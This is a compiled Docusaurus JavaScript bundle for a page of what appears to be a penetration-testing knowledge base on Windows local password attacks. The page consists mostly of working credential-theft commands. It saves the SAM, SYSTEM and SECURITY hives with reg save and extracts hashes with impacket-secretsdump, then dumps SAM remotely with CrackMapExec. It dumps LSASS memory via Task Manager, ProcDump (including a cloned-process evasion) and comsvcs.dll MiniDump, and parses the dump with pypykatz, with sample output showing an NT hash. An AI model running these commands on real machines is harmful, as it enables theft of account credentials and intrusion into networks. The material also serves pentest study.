"use strict";(self.webpackChunkhkb=self.webpackChunkhkb||[]).push([[552],{3905:(e,t,a)=>{a.d(t,{Zo:()=>p,kt:()=>k});var n=a(7294);function s(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function r(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function i(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?r(Object(a),!0).forEach((function(t){s(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):r(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function l(e,t){if(null==e)return{};var a,n,s=function(e,t){if(null==e)return{};var a,n,s={},r=Object.keys(e);for(n=0;n<r.length;n++)a=r[n],t.indexOf(a)>=0||(s[a]=e[a]);return s}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(n=0;n<r.length;n++)a=r[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(s[a]=e[a])}return s}var o=n.createContext({}),m=function(e){var t=n.useContext(o),a=t;return e&&(a="function"==typeof e?e(t):i(i({},t),e)),a},p=function(e){var t=m(e.components);return n.createElement(o.Provider,{value:t},e.children)},c="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},d=n.forwardRef((function(e,t){var a=e.components,s=e.mdxType,r=e.originalType,o=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),c=m(a),d=s,k=c["".concat(o,".").concat(d)]||c[d]||u[d]||r;return a?n.createElement(k,i(i({ref:t},p),{},{components:a})):n.createElement(k,i({ref:t},p))}));function k(e,t){var a=arguments,s=t&&t.mdxType;if("string"==typeof e||s){var r=a.length,i=new Array(r);i[0]=d;var l={};for(var o in t)hasOwnProperty.call(t,o)&&(l[o]=t[o]);l.originalType=e,l[c]="string"==typeof e?e:s,i[1]=l;for(var m=2;m<r;m++)i[m]=a[m];return n.createElement.apply(null,i)}return n.createElement.apply(null,a)}d.displayName="MDXCreateElement"},4101:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>o,contentTitle:()=>i,default:()=>u,frontMatter:()=>r,metadata:()=>l,toc:()=>m});var n=a(7462),s=(a(7294),a(3905));const r={},i="Windows",l={unversionedId:"local-password-attacks/windows",id:"local-password-attacks/windows",title:"Windows",description:"SAM",source:"@site/docs/local-password-attacks/windows.md",sourceDirName:"local-password-attacks",slug:"/local-password-attacks/windows",permalink:"/hkb/local-password-attacks/windows",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Linux",permalink:"/hkb/local-password-attacks/linux"},next:{title:"FTP",permalink:"/hkb/services/ftp"}},o={},m=[{value:"SAM",id:"sam",level:2},{value:"Registry Hives",id:"registry-hives",level:3},{value:"Dumping the SAM Registry Hive",id:"dumping-the-sam-registry-hive",level:3},{value:"Dumping SAM Remotely",id:"dumping-sam-remotely",level:3},{value:"Cracking the Hashes",id:"cracking-the-hashes",level:3},{value:"LSASS",id:"lsass",level:2},{value:"Dumping LSASS Memory",id:"dumping-lsass-memory",level:3},{value:"Task Manager",id:"task-manager",level:4},{value:"ProcDump",id:"procdump",level:4},{value:"comsvcs.dll",id:"comsvcsdll",level:4},{value:"Extracting Credentials",id:"extracting-credentials",level:3},{value:"Pypykatz",id:"pypykatz",level:4}],p={toc:m},c="wrapper";function u(e){let{components:t,...r}=e;return(0,s.kt)(c,(0,n.Z)({},p,r,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"windows"},"Windows"),(0,s.kt)("h2",{id:"sam"},"SAM"),(0,s.kt)("p",null,"You need to have administrator privileges to access the SAM Registry hive."),(0,s.kt)("h3",{id:"registry-hives"},"Registry Hives"),(0,s.kt)("table",null,(0,s.kt)("thead",{parentName:"table"},(0,s.kt)("tr",{parentName:"thead"},(0,s.kt)("th",{parentName:"tr",align:null},"Registry Hive"),(0,s.kt)("th",{parentName:"tr",align:null},"Description"))),(0,s.kt)("tbody",{parentName:"table"},(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},(0,s.kt)("inlineCode",{parentName:"td"},"hklm\\sam")),(0,s.kt)("td",{parentName:"tr",align:null},"Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},(0,s.kt)("inlineCode",{parentName:"td"},"hklm\\system")),(0,s.kt)("td",{parentName:"tr",align:null},"Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.")),(0,s.kt)("tr",{parentName:"tbody"},(0,s.kt)("td",{parentName:"tr",align:null},(0,s.kt)("inlineCode",{parentName:"td"},"hklm\\security")),(0,s.kt)("td",{parentName:"tr",align:null},"Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.")))),(0,s.kt)("h3",{id:"dumping-the-sam-registry-hive"},"Dumping the SAM Registry Hive"),(0,s.kt)("p",null,"Dump the SAM Registry hive using the ",(0,s.kt)("inlineCode",{parentName:"p"},"reg")," command and transfer the files to your attacker machine.:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-batch"},"reg save HKLM\\sam sam\nreg save HKLM\\system system\nreg save HKLM\\security security\n")),(0,s.kt)("p",null,"Use ",(0,s.kt)("inlineCode",{parentName:"p"},"impacket-secretsdump")," to extract the hashes from the SAM Registry hive:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"impacket-secretsdump -sam sam -system system -security security LOCAL\n")),(0,s.kt)("h3",{id:"dumping-sam-remotely"},"Dumping SAM Remotely"),(0,s.kt)("p",null,"Dump it using ",(0,s.kt)("inlineCode",{parentName:"p"},"CrackMapExec"),":"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash",metastring:'title="Dump SAM with CrackMapExec"',title:'"Dump',SAM:!0,with:!0,'CrackMapExec"':!0},"cme smb <ip> -u <username> -p <password> --sam\n")),(0,s.kt)("admonition",{type:"tip"},(0,s.kt)("p",{parentName:"admonition"},"The output format is ",(0,s.kt)("inlineCode",{parentName:"p"},"username:RID:LMHASH:NTHASH"),".")),(0,s.kt)("h3",{id:"cracking-the-hashes"},"Cracking the Hashes"),(0,s.kt)("p",null,"Navigate to the ",(0,s.kt)("a",{parentName:"p",href:"/commands-cheatsheet/crackmapexec#brute-forcing-credentials"},"CrackMapExec Commands Cheatsheet"),"."),(0,s.kt)("h2",{id:"lsass"},"LSASS"),(0,s.kt)("p",null,"LSASS (Local Security Authority Subsystem Service) in Windows is a process responsible for enforcing security policies, managing user authentication, and auditing system events."),(0,s.kt)("h3",{id:"dumping-lsass-memory"},"Dumping LSASS Memory"),(0,s.kt)("p",null,"LSASS memory dumps can pose serious security risks as they may contain sensitive information. This can include plaintext passwords, hash values, and other authentication details used in the system."),(0,s.kt)("h4",{id:"task-manager"},"Task Manager"),(0,s.kt)("p",null,"The easiest way to dump LSASS memory is to use Task Manager. You'll need UI access to the machine to do this."),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"Open Task Manager"),(0,s.kt)("li",{parentName:"ol"},"Find the ",(0,s.kt)("inlineCode",{parentName:"li"},"Local Security Authority Process")),(0,s.kt)("li",{parentName:"ol"},"Right-click on the process and select ",(0,s.kt)("inlineCode",{parentName:"li"},"Create dump file"))),(0,s.kt)("p",null,(0,s.kt)("img",{alt:"Task Manager",src:a(1144).Z,width:"1024",height:"738"})),(0,s.kt)("h4",{id:"procdump"},"ProcDump"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/sysinternals/downloads/procdump"},"ProcDump")," is a command-line utility that can be used to create memory dumps of processes."),(0,s.kt)("admonition",{title:"ProcDump",type:"caution"},(0,s.kt)("p",{parentName:"admonition"},"You'll need to download ProcDump on the target machine to use it.")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-batch",metastring:'title="Using ProcDump to Dump LSASS Memory"',title:'"Using',ProcDump:!0,to:!0,Dump:!0,LSASS:!0,'Memory"':!0},"procdump.exe -accepteula -ma lsass.exe lsass.dmp\n")),(0,s.kt)("p",null,"You can also avoid reading the ",(0,s.kt)("inlineCode",{parentName:"p"},"lsass.exe")," process by dumping a cloned process instead."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-batch",metastring:'title="Using ProcDump to Dump LSASS Memory (Cloned Process)"',title:'"Using',ProcDump:!0,to:!0,Dump:!0,LSASS:!0,Memory:!0,"(Cloned":!0,'Process)"':!0},"procdump.exe -accepteula -r -ma lsass.exe lsass.dmp\n")),(0,s.kt)("h4",{id:"comsvcsdll"},"comsvcs.dll"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-batch",metastring:'title="Using comsvcs.dll to Dump LSASS Memory"',title:'"Using',"comsvcs.dll":!0,to:!0,Dump:!0,LSASS:!0,'Memory"':!0},".\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full\n")),(0,s.kt)("p",null,"You can also use the PowerShell variant of this command."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-powershell",metastring:'title="Using comsvcs.dll to Dump LSASS Memory (PowerShell)"',title:'"Using',"comsvcs.dll":!0,to:!0,Dump:!0,LSASS:!0,Memory:!0,'(PowerShell)"':!0},"rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full\n")),(0,s.kt)("h3",{id:"extracting-credentials"},"Extracting Credentials"),(0,s.kt)("h4",{id:"pypykatz"},"Pypykatz"),(0,s.kt)("p",null,"This is the Linux version of ",(0,s.kt)("a",{parentName:"p",href:"https://github.com/gentilkiwi/mimikatz"},"Mimikatz"),"."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"pypykatz lsa minidump <lsass dump file>\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash",metastring:'title="Pypykatz Example"',title:'"Pypykatz','Example"':!0},"pypykatz lsa minidump lsass.dmp\n\n...SNIP...\n== LogonSession ==\nauthentication_id 1354633 (14ab89)\nsession_id 2\nusername bob\ndomainname DESKTOP-33E7O54\nlogon_server WIN-6T0C3J2V6HP\nlogon_time 2021-12-14T18:14:25.514306+00:00\nsid S-1-5-21-4019466498-1700476312-3544718034-1001\nluid 1354633\n    == MSV ==\n        Username: bob\n        Domain: DESKTOP-33E7O54\n        LM: NA\n        NT: 64f12cddaa88057e06a81b54e73b949b\n        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8\n        DPAPI: NA\n...SNIP...\n")))}u.isMDXComponent=!0},1144:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/taskmanagerdump-fa32fe4e2fa0d13045b6f08ff5370967.png"}}]);